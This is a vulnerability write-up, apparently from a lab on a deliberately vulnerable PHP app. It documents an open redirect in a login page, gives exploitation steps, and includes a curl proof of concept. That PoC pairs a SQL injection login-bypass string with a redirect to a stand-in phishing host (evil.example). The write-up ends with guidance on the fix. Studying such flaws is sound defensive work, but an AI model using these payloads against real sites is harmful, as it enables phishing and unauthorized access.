# 21 — Open redirect in the login page

- **OWASP Top 10 (2021):** A01:2021 – Broken Access Control
- **Severity:** Medium
- **Difficulty:** Easy

## Where

`web/login.php:7-8,23-24` — `redirectUrl` parameter:

```php
if (isset($_GET['redirectUrl']))  $redirectUrl = $_GET['redirectUrl'];
if (isset($_POST['redirectUrl'])) $redirectUrl = $_POST['redirectUrl'];
...
$dest = $redirectUrl != '' ? $redirectUrl : '/panel/index.php';
header('Location: ' . $dest);
```

## How it works (root cause)

The post-login redirect target is taken from user input with **no
allow-list / scheme validation**. A successful login (or the SQLi auth
bypass in 03) sends the victim to any URL the attacker chooses.

## Exploitation steps

1. Craft a login link that redirects to an attacker site after (apparent)
   authentication:

   ```
   http://localhost:8080/login.php?redirectUrl=https://evil.example/phish
   ```

2. The victim "logs in" (or the attacker uses `username=admin' -- ` from 03
   to force a redirect without credentials) and is sent to
   `https://evil.example/phish` — which can then harvest the entered
   credentials, since the victim just typed a password a moment ago.

## Working PoC (verified)

```bash
curl -s -D - -o /dev/null \
  --data-urlencode "username=admin' -- " -d 'password=x' \
  'http://localhost:8080/login.php?redirectUrl=https://evil.example/phish'
```

Response:

```
HTTP/1.1 302 Found
Location: https://evil.example/phish
```

The redirect is exactly the attacker-supplied URL.

## Expected result / verification

- After a (SQLi-forced) login, the `Location` header equals the attacker's
  URL.
- The login page also embeds `redirectUrl` in the hidden form field (line
  34), so the value persists into the POST.

## Attack chain

```
open redirect
  → phishing: victim enters credentials on a lookalike page right after
    "logging in"
  → or: chain with 03 (auth bypass) to bounce a user to a malicious page
    while their real session is created
```

## Notes

- A safe implementation restricts `redirectUrl` to same-origin relative
  paths (e.g. must start with `/` and not `//` or `/\`) or uses an
  explicit allow-list.
